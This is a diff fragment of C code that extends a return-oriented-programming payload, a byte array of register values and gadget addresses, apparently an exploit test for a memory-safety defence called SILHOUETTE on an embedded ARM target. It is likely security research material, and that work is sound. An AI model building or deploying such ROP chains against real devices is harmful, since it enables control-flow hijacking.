@@ -377,7 +377,13 @@ char payload[] = "0123456789abcde\x00"	// Content for buf
 		 "\x0a\x00\x00\x00"	// R4: 0x0a ('\n')
 		 "\x00\x00\x00\x00"	// R5: 0
 		 "\x00\x00\x00\x00"	// R7: 0
-		 "\x29\x42\x02\x00"	// PC: 0x00025524 <ResetISR+0xac> (wfi; b 0x00025525)
+		 "\x29\x42\x02\x00"	// PC: 0x00024228 <__i2b+0x10> (strb r4,[r0,r0]; pop {r4,r5,r7,pc})
+
+		 /* Gadget 28 */
+		 "\x00\x00\x00\x00"	// R4: 0
+		 "\x00\x00\x00\x00"	// R7: 0
+		 "\x00\x00\x00\x00"	// R7: 0
+		 "\x25\x55\x02\x00"	// PC: 0x00025524 <ResetISR+0xac> (wfi; b 0x00025525)
 #endif /* SILHOUETTE */
 		 "";
 
